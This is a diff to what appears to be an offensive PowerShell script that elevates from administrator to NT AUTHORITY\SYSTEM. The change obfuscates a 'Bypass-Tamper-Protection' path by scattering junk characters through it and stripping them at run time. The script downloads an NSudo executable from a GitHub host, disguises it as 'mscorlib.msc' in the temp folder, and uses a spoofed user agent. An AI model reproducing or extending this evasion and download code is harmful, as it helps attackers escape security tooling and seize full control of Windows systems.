@@ -186,6 +186,7 @@ If($Action -ieq "Elevate"){
       Required dependencies: Reflection.Assembly {native}
       Required dependencies: DavSyncProvider.dll { auto-Build }
 
+   .NOTES
       If executed with administrator privileges and the 'Elevate' @argument its sellected,
       then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
    
@@ -204,8 +205,8 @@ If($Action -ieq "Elevate"){
       Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
    
       ## Download and masquerade the required standalone executable
-      $Colombo = "Bypas" + "s-Tamper-Pro" + "tection/main/NSudo" -join ''
-      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
+      $Cristovao = "By!@p!a@" + "ss-Ta@m!p@e@!r-Pro@" + "tec@ti@o!n/ma@!i@n/N!@Su@!d@o" -join ''
+      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){$Colombo = $Cristovao.Split("@").split("!") -Join ''
          iwr -Uri https://raw.githubusercontent.com/swagkarna/${Colombo}.exe -OutFile $Env:TMP\mscorlib.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
